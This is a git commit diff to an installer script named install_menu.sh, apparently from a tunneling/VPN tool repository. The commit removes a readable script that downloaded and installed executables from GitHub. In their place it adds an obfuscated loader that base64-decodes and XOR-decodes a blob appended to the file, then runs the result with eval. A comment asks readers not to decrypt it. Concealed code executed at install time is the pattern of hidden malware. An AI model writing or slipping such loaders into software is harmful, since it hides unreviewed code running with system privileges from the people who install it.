c629ebba58c3085e4ce9d60927cae9e54e6f9324
ianexec <newvpnlunatix293@gmail.com>
2025-07-07 10:13:05 +0700

    Add files via upload

--- HandlerSentry/install_menu.sh
+++ HandlerSentry/install_menu.sh
@@ -1,19 +1,18 @@
 #!/bin/bash
+# Jangan Di Decrypt Dong Puuhhh || Lunatic Tunneling || Bandung Barat , Indonesia|| Encrypted shell - obfuscated XOR + base64 loader
 
-#Mengunduh dan mengekstrak menu.zip
-apt update -y
-apt install -y unzip
-
-    wget https://raw.githubusercontent.com/ianexec/FINALIZED/main/HandlerSentry/LunatiX_sh
-    unzip LunatiX_sh
-    chmod +x menu/*
-    mv menu/* /usr/local/sbin
-    rm -rf menu
-    rm -rf LunatiX_sh
-    
-    wget https://raw.githubusercontent.com/ianexec/FINALIZED/main/HandlerSentry/LunatiX_py
-    unzip LunatiX_py
-    chmod +x menu/*
-    mv menu/* /usr/bin
-    rm -rf menu
-    rm -rf LunatiX_py    
+_kk=123
+_dd=$(tail -n +10 "$0")
+_zz=$(echo "$_dd" | base64 -d | perl -pe 's/(.)/chr(ord($1)^'"$_kk"')/eg')
+eval "$_zz"
+exit 0
+#==BEGIN==
+WFpUGRIVVBkaCBMKClg2HhUcDhUfDhNbHxoVWxYeFRweEAgPCRoQWxYeFQ5VARILChoLD1sOCx8a
+Dx5bVgIKGgsPWxIVCA8aFxdbVgJbDhUBEgsKCltbW1sMHB4PWxMPDwsIQVRUCRoMVRwSDxMOGQ4I
+HgkYFBUPHhUPVRgUFlQSGhUeAx4YVD0yNTo3MiE+P1QWGhIVVDMaFR8XHgkoHhUPCQJUNw4VGg8S
+IyQIEwpbW1tbDhUBEgtbNw4VGg8SIyQIEwpbW1tbGBMWFB9bUANbFh4VDlRRCltbW1sWDVsWHhUO
+VFFbVA4ICVQXFBgaF1QIGRIVCltbW1sJFltWCR1bFh4VDgpbW1tbCRZbVgkdWzcOFRoPEiMkCBMK
+W1tbWwpbW1tbDBweD1sTDw8LCEFUVAkaDFUcEg8TDhkOCB4JGBQVDx4VD1UYFBZUEhoVHgMeGFQ9
+MjU6NzIhPj9UFhoSFVQzGhUfFx4JKB4VDwkCVDcOFRoPEiMkCwIKW1tbWw4VARILWzcOFRoPEiMk
+CwIKW1tbWxgTFhQfW1ADWxYeFQ5UUQpbW1tbFg1bFh4VDlRRW1QOCAlUGRIVCltbW1sJFltWCR1b
+Fh4VDgpbW1tbCRZbVgkdWzcOFRoPEiMkCwJbW1tbCg==
